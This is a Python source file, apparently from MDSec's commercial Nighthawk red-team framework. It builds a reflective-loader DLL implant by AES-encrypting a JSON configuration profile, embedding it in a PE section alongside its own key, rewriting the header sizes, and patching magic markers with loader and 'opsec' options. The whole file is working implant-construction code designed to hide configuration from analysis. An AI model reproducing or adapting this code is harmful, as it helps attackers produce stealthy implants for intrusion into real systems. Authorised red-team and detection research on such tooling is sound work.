# Copyright 2022 MDSec Consulting Ltd
# Use of this source code is governed by an End User License Agreement,
# details of this agreement can be found in EULA.pdf
# Nighthawk (r)

from __future__ import print_function

import os, sys
import struct, random, string
import json

from helpers import aes128_encrypt, gzip_compress, is_pe_arch_x64

from rdll_properties_x86 import X86RDLLProperties
from rdll_properties_x64 import X64RDLLProperties

REFLECTIVE_LOADER_STRATEGY_MAGIC = b"\x0D\x4B\x85\xE7"
REFLECTIVE_LOADER_LOADLIB_MAGIC = b"\x0E\x4B\x85\xE7"
REFLECTIVE_LOADER_GETPROC_MAGIC = b"\x0F\x4B\x85\xE7"
REFLECTIVE_LOADER_OPSECEXTRA_MAGIC = b"\x0A\x4B\x85\xE7"
REFLECTIVE_DLL_IS_BOOTSTRAPPED_MAGIC = b"\x0B\x4B\x85\xE7"

def __update_section_header(dll_bytes, sec_offs, virtual_size, raw_data_size):
	new_section = dll_bytes[sec_offs:sec_offs + 8]
	new_section += struct.pack("<I", virtual_size)
	new_section += dll_bytes[sec_offs + 12:sec_offs + 16]
	new_section += struct.pack("<I", raw_data_size)
	new_section += dll_bytes[sec_offs + 20:sec_offs + 40]
	return dll_bytes[:sec_offs] + new_section + dll_bytes[sec_offs + 40:]

def __embed_profile_into_rdll(rdll_bytes, rdll_properties, decryption_stub, enc_key, profile_data):
	raw_data_size = rdll_properties.get_profile_section_raw_size()
	raw_data_offs = rdll_properties.get_profile_section_raw_address()
	img_size_offs = rdll_properties.get_image_size_offset()
	section_alignment = rdll_properties.get_section_alignment()
	sec_offs = rdll_properties.get_profile_section_header_offset()
	
	profile_data = aes128_encrypt(enc_key, gzip_compress(profile_data))

	added_data = decryption_stub
	added_data += struct.pack("<I", len(profile_data))
	added_data += profile_data
	
	padding_length = (section_alignment - (len(added_data) % section_alignment))
	
	new_dll = rdll_bytes[:img_size_offs]
	orig_img_size = struct.unpack("<I", rdll_bytes[img_size_offs:img_size_offs + 4])[0]
	new_img_size = orig_img_size + len(added_data) + padding_length - raw_data_size
	new_dll += struct.pack("<I", new_img_size)
	new_dll += rdll_bytes[img_size_offs + 4:raw_data_offs]
	new_dll += added_data + b"\x00" * padding_length
	new_dll = __update_section_header(new_dll, sec_offs, len(added_data), len(added_data) + padding_length)

	return new_dll

def __get_decryption_stub(enc_type, aes_key, keying_args):
	decryption_stub = struct.pack("b", enc_type)
	
	if len(aes_key) != 16:
		raise Exception("enc-type 0 - please set AES key to 16 character string")
	
	if enc_type == 0:
		decryption_stub += bytes(aes_key)
	else:
		raise Exception("Invalid enc-type please supply correct value");

	return decryption_stub

def embed_profile(rdll_bytes, profile, ldr_opts, is_keyed):
	if is_pe_arch_x64(rdll_bytes):
		rdll_properties = X64RDLLProperties
	else:
		rdll_properties = X86RDLLProperties
	
	# this is encryption only for the embedded profile
	enc_type = 0 # embedded AES key
	aes_key = "".join([random.choice(string.ascii_letters) for i in xrange(16)])
	keying_args = []

	decryption_stub = __get_decryption_stub(enc_type, aes_key, keying_args)
	
	new_dll = __embed_profile_into_rdll(
			rdll_bytes,
			rdll_properties,
			decryption_stub,
			aes_key,
			json.dumps(profile)
		)
	
	if new_dll.count(REFLECTIVE_LOADER_STRATEGY_MAGIC) != 1:
		raise Exception("Invalid loader strategy magic")

	new_dll = new_dll.replace(REFLECTIVE_LOADER_STRATEGY_MAGIC, struct.pack("<I", ldr_opts["loader-strategy"]))
	
	if new_dll.count(REFLECTIVE_LOADER_LOADLIB_MAGIC) != 1:
		raise Exception("Invalid loader loadlib magic")
	
	new_dll = new_dll.replace(REFLECTIVE_LOADER_LOADLIB_MAGIC, struct.pack("<I", ldr_opts["loader-loadlib"]))
	
	if new_dll.count(REFLECTIVE_LOADER_GETPROC_MAGIC) != 1:
		raise Exception("Invalid loader getproc magic")
	
	new_dll = new_dll.replace(REFLECTIVE_LOADER_GETPROC_MAGIC, struct.pack("<I", ldr_opts["loader-getproc"]))
	
	if new_dll.count(REFLECTIVE_LOADER_OPSECEXTRA_MAGIC) != 1:
		raise Exception("Invalid loader opsecextra magic")
	
	new_dll = new_dll.replace(REFLECTIVE_LOADER_OPSECEXTRA_MAGIC, struct.pack("<I", ldr_opts["loader-opts-extra"]))
	
	if new_dll.count(REFLECTIVE_DLL_IS_BOOTSTRAPPED_MAGIC) != 1:
		raise Exception("Invalid loader bootstrap length magic")
	
	new_dll = new_dll.replace(REFLECTIVE_DLL_IS_BOOTSTRAPPED_MAGIC, struct.pack("<I", 1 if is_keyed and ldr_opts["loader-erase-keystub"] else 0))
	
	return new_dll
